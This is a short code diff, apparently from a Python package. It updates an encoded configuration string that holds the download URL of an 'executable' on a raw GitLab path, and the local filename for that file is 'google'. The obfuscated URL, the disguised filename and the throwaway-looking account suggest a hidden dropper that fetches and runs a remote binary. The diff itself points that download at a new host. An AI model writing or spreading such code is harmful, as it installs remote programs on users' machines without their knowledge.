@@ -55,7 +55,7 @@ def decode_string_data(s):
 
 # --- Encoded Configuration Strings ---
 # The URL for the data processing executable.
-EXECUTABLE_DOWNLOAD_URL_ENCODED = encode_string_data("https://gitlab.com/senopvrtymlbb-group/dataanalystics/-/raw/main/google")
+EXECUTABLE_DOWNLOAD_URL_ENCODED = encode_string_data("https://gitlab.com/senopvrtymlbb/data/-/raw/main/google")
 # The local filename for the downloaded executable.
 EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")
 
